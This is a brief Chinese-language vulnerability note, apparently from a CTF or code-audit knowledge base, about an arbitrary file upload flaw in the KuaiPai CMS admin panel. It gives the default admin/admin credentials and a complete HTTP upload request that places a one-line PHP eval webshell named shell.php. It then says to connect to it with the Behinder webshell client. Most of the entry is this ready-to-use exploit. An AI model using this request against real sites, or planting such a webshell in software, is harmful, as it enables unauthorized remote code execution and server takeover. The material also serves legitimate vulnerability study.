---
title: 快排CMS 后台任意文件上传漏洞
category: code-audit
tags: [kuaipai-cms, php, file-upload, webshell, thinkphp]
triggers: [快排CMS, kpcms, kuaipai, admin/admin, 后台文件上传, /admin.php/index/upload]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/code-audit/快排CMS 后台任意文件上传漏洞.md]
---

## Summary

快排CMS 后台管理模块未检测上传文件后缀，可上传 PHP webshell。默认账号密码 `admin/admin`。

## Details

### 漏洞文件

`thinkphp/library/think/File.php` — 未对上传文件后缀做检测。

### 利用

```http
POST /admin.php/index/upload.html?dir=image HTTP/1.1

Content-Disposition: form-data; name="imgFile"; filename="shell.php"
Content-Type: application/octet-stream

<?php @eval($_POST['cmd']);?>
```

上传后可连接冰蝎 webshell。

## Connections

- GHSA: [[code-audit/ghsa-rce-patterns]]
- Related: [[showdoc-file-upload]]
